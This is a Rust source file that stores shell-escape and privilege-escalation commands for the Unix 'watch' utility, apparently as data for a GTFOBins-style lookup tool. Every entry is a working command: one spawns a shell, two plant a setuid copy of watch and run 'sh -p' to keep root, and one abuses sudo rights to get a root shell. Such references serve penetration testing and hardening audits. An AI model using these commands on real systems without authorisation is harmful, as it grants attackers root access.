pub static BIN_NAME: &'static str = "watch";
pub static SH_CODE: &'static str = r#"
    
    watch -x sh -c 'reset; exec sh 1>&0 2>&0'
"#;
pub static SUID_DESC: &'static str =
    "This keeps the SUID privileges only if the `-x` option is present.";
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which watch) .

    ./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'
"#;
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which watch) .

    ./watch 'reset; exec sh 1>&0 2>&0'
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code { 
	title: "LSUID_CODE",
	code: LSUID_CODE,
	tag: Tag::LSUID,
};
